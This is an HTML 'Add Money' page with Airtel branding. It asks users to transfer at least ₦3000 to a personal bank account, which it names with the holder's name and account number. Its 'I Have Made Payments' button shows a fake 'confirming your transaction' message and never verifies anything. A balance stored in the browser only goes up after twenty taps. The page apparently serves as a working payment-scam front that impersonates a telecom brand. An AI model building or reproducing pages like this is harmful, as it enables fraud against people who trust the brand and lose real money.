<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Add Money</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #fff;
      overflow: hidden;
      position: relative;
    }.logo-top {
  text-align: center;
  margin-top: 20px;
}

.logo-top img {
  width: 100px;
  animation: float 4s infinite ease-in-out;
}

@keyframes float {
  0%, 100% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
}

.background-animation {
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  overflow: hidden;
  z-index: -1;
}

.logo-piece {
  position: absolute;
  width: 20px;
  height: 20px;
  background-image: url('airtel-logo.png');
  background-size: cover;
  opacity: 0.1;
  animation: scatter 20s linear infinite;
}

@keyframes scatter {
  0% { transform: translate(0, 0) rotate(0deg); }
  100% { transform: translate(100vw, 100vh) rotate(720deg); }
}

.container {
  padding: 20px;
  text-align: center;
  margin-top: 80px;
}

.container input {
  padding: 10px;
  font-size: 16px;
  width: 80%;
  margin-bottom: 15px;
  border: 1px solid red;
  border-radius: 8px;
}

.btn {
  background-color: red;
  color: white;
  padding: 12px 25px;
  border: none;
  border-radius: 8px;
  cursor: pointer;
}

.account-details {
  display: none;
  margin-top: 50px;
  text-align: center;
}

.popup {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
  padding: 15px;
  position: fixed;
  top: 30%;
  left: 50%;
  transform: translate(-50%, -50%);
  border-radius: 12px;
  z-index: 10;
  display: none;
}

  </style>
</head>
<body>
  <div class="background-animation">
    <!-- Generate many tiny logo pieces -->
    <script>
      for (let i = 0; i < 50; i++) {
        const logo = document.createElement('div');
        logo.className = 'logo-piece';
        logo.style.top = Math.random() * window.innerHeight + 'px';
        logo.style.left = Math.random() * window.innerWidth + 'px';
        document.body.querySelector('.background-animation').appendChild(logo);
      }
    </script>
  </div>  <div class="logo-top">
    <img src="airtel-logo.png" alt="Airtel Logo" />
  </div>  <div class="container">
    <input type="number" id="amountInput" placeholder="Enter amount (min ₦3000)" />
    <br />
    <button class="btn" onclick="continueProcess()">Continue</button>
  </div>  <div class="popup" id="popup"></div>  <div class="account-details" id="accountDetails">
    <h3>Send Payment To</h3>
    <p><strong>Account Name:</strong> EMMANUEL OKWUNNA</p>
    <p><strong>Bank:</strong> SmartCash Payment Service Bank</p>
    <p><strong>Account Number:</strong> 812 489 0070</p>
    <button class="btn" onclick="confirmPayment()">I Have Made Payments</button>
    <br /><br />
    <button class="btn" onclick="goToDashboard()">Return to Dashboard</button>
  </div>  <script>
    let tapCount = localStorage.getItem('tapCount') ? parseInt(localStorage.getItem('tapCount')) : 0;
    let balance = localStorage.getItem('balance') ? parseInt(localStorage.getItem('balance')) : 300;

    function continueProcess() {
      const amount = parseInt(document.getElementById('amountInput').value);
      if (isNaN(amount) || amount < 3000) {
        showPopup("Please enter a minimum of ₦3000");
      } else {
        showPopup("Please wait...");
        setTimeout(() => {
          document.getElementById('popup').style.display = 'none';
          document.querySelector('.container').style.display = 'none';
          document.getElementById('accountDetails').style.display = 'block';
        }, 2000);
      }
    }

    function confirmPayment() {
      tapCount++;
      localStorage.setItem('tapCount', tapCount);
      showPopup("Please wait, we are confirming your transaction...");
      setTimeout(() => {
        document.getElementById('popup').style.display = 'none';
      }, 3000);

      if (tapCount >= 20) {
        tapCount = 0;
        balance += 3000;
        localStorage.setItem('tapCount', tapCount);
        localStorage.setItem('balance', balance);
      }
    }

    function showPopup(message) {
      const popup = document.getElementById('popup');
      popup.innerText = message;
      popup.style.display = 'block';
    }

    function goToDashboard() {
      window.location.href = 'dashboard.html';
    }
  </script></body>
</html>
